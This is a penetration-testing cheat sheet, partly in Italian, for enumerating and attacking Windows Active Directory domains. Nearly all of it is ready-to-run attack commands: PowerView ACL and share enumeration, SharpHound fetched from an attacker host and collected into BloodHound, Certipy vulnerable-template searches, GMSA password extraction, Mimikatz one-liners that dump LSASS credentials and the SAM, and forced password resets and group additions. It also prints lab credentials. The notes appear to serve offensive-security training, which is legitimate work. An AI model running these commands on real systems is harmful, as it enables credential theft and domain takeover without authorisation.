# Manual Enumeration

## Enumeration using Legacy Windows Tools

Enumeration from **kali**:

```bash
# enumerating domain users with impacket
impacket-GetADUsers -dc-ip $IP "domain.com/" -all 
```

Enumeration from **windows**:

```powershell
# domain users enumeration
net user /domain

# enumeration of a specific user
net user $USERNAME /domain

# enumeration of groups present within the domain
net group /domain

# enumeration of members of a specific group
net group "$GROUP_NAME" /domain

# domain address enumeration
nltest /dsgetdc:domain.com
```

## Enumerating using PowerShell and .NET Classes

Esempio di script _enumeration.ps1_ per estrarre solo il path LDAP:

```powershell
# Domain Class: contiene una referance al "PdcRoleOwner" nelle proprietà.
# GetCurrentDomain(): ritorna l'oggetto di dominio per l'utente corrente.
$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
# per ottenere il DN (DistinguishedName)
$DN = ([adsi]'').distinguishedName 
$LDAP = "LDAP://$PDC/$DN"
$LDAP
```

Per lanciare lo script:

```powershell
powershell -ep bypass
.\enumeration.ps1
```

## Enumeration Through Service Principal Names

Enumeration of SPNs in the domain using _setspn.exe_ (already present on Windows):

```powershell
setspn -L iis_service
```

To resolve the _serviceprincipalname_ found:

```powershell
nslookup.exe $serviceprincipalname
```


# Automated Enumeration
## Enumeration with PowerView

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```

Domain information:

```powershell
# informazioni di dominio
Get-NetDomain

# informazioni reattive agli utenti presenti nel dominio
Get-NetUser

# informazioni relative agli utenti selezionando alcune informazioni chiave
Get-NetUser | select cn,pwdlastset,lastlogon

# Enumeration of SPNs
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# informazioni reattive ai gruppi presenti nel dominio
Get-NetGroup

# informazioni relative ai gruppi selezionando alcune informazioni chiave
Get-NetGroup | select cn
Get-NetGroup -Domain domain.com | select name

# membri di uno specifico gruppo
Get-DomainGroupMember Group_Name -Recurse

# esempi
Get-NetGroup "Sales Department" | select member
Get-NetUser "fred"
Get-DomainGroupMember "Domain Admins" -Recurse

# enumeration del gruppo Remote Desktop Users (RDP)
Get-NetLocalGroupMember -ComputerName COMPUTER-NAME -GroupName "Remote Desktop Users"

# enumeration del gruppo Remote Management Users (WinRM)
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# Command that allows you to scan the network to determine if the current user has administrator permissions on any of the computers in the domain:
Find-LocalAdminAccess

# Search for other logged in users
Get-NetSession -ComputerName $COMPUTER_NAME
Get-NetSession -ComputerName $COMPUTER_NAME -Verbose
```

## Enumerating Object Permissions

[The Hacker Recipes - DACL Abuse]([DACL abuse | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/))

An object in AD can have a set of permissions applied to it with different _Access Control Entries_ (ACE). These ACEs make up the _Access Control List_ (ACL) and each ACE defines what access to a specific object is allowed or not.

List of permissions on an object:

```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```

### Enumerare gli ACE tramite Get-DomainObjectACL

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1

$sid = Convert-NameToSid $USER_NAME
```

```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

Example output:

```powershell-session
AceQualifier           : AccessAllowed
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-1176
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-1181
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

### Enumerate ACEs via _Get-ObjectAcl_

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```

```powershell
Get-ObjectAcl -Identity $USER_NAME
```

The previous command shows us several pieces of information and among the most important we have:
- ObjectSID
- ActiveDirectoryRights
- SecurityIdentifier

To convert the _ObjectSID_ and the _SecurityIdentifier_:

```powershell
Convert-SidToName $SID_NUMBER
```

Command to find objects with _GenericAll_ permission within a specific group:

```powershell
Get-ObjectAcl -Identity "$GROUP_NAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

The above command may return several SIDs. To quickly convert them, this command could be used:

```powershell
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
```

If we find a user with elevated privileges, this could be exploited for various purposes.

For example, this user could be added to a group:

```powershell
net group "$GROUP_NAME" $USER_NAME /add /domain
```

## Enumerating Domain Shares

Enumerate shares in the domain with _Find-DomainShare_:

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
```

```powershell
Find-DomainShare

Find-DomainShare -CheckShareAccess
```

In the example, we focus on _SYSVOL_, a share used for domain policies and scripts. This can be found here:

```bash
ls \\%SystemRoot%\SYSVOL\Sysvol\domain-name

# esempio
ls \\dc01.medtech.com\SYSVOL\medtech.com
```

There may be important information within the policies:

```bash
ls \\%SystemRoot%\SYSVOL\Sysvol\domain-name\Policies

# esempio
ls \\dc01.medtech.com\SYSVOL\medtech.com\Policies
```

In general, it is always worth checking the shares and paying particular attention to the non-default ones.

## Collecting Data with SharpHound

```powershell
# from kali
bloodhound-python -c ALL -u USERNAME -p 'PASSWORD' -d DOMAIN.COM -dc dc01.DOMAIN.COM -ns %IP

# from Windows
iwr -uri http://$KALI_IP:9999/windows/SharpHound.ps1 -Outfile SharpHound.ps1

powershell -ep bypass

Import-Module .\SharpHound.ps1

Get-Help Invoke-BloodHound

Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\programdata\ -OutputPrefix "audit"
```

## Analysing Data using BloodHound

Start _neo4j_:

```bash
sudo neo4j start
```

Go to http://localhost:7474 and log in (_neo4j_:_neo4j_). You will then be asked to change your password.

Start _bloodhound_:

```bash
bloodhound
```

Log in with the credentials previously set on _neo4j_ (neo4j:neo4j96$!).

Upload the zip file, previously generated by _SharpHound_, using the _Upload Data_ function.

### BloodHound Query

```cypher
MATCH (m:Computer) RETURN m
```

```cypher
MATCH (m:User) RETURN m
```

```cypher
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```


# Other Checks

## Certipy

One of the first things to do when dealing with an AD is to check the Advice Directory Certificate Services (ACDS).

```bash
certipy find -dc-ip $IP -ns $IP -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -stdout

certipy find -dc-ip $IP -u USER@DOMAIN.COM -p 'PASSWORD' -vulnerable -stdout
```

## GMSA (Group Managed Service Account)

If a user is part of the **gSMA** (Group Managed Service Account) group, you can get the password.

To confirm that the user is part of this group:

```
Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}
```

To understand from which group you can extract passwords you need to use PowerView.ps1:

```
. .\PowerView.ps1
```

```
Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,PrincipalsAllowedToRetrieveManagedPassword
```

Next, you need to download [GMSAPasswordReader.exe](https://github.com/expl0itabl3/Toolies/blob/master/GMSAPasswordReader.exe), transfer it to your machine, and then run it:

```
.\GMSAPasswordReader.exe — AccountName ‘user_name’
```

## Mimikatz

```powershell
# mimikatz one-liner
.\mimikatz64.exe "privilege::debug" "token::elevate" "sekurlsa::msv" "lsadump::sam" "exit"

.\mimikatz64.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

.\mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# SAM & SYSTEM
./mimikatz64.exe "lsadump::sam  /system:C:\windows.old\windows\system32\SYSTEM /sam:C:\windows.old\windows\system32\SAM" "exit"
```

```
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::minidump lsass.dmp
```

## Domain User Password Change

```powershell
Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\$USERNAME', $SecPassword)

$userPassword = ConvertTo-SecureString 'PASSWORD' -AsPlainText -Force

Set-DomainUserPassword -Identity $USERNAME -AccountPassword $userPassword -Credential $Cred -Verbose
```

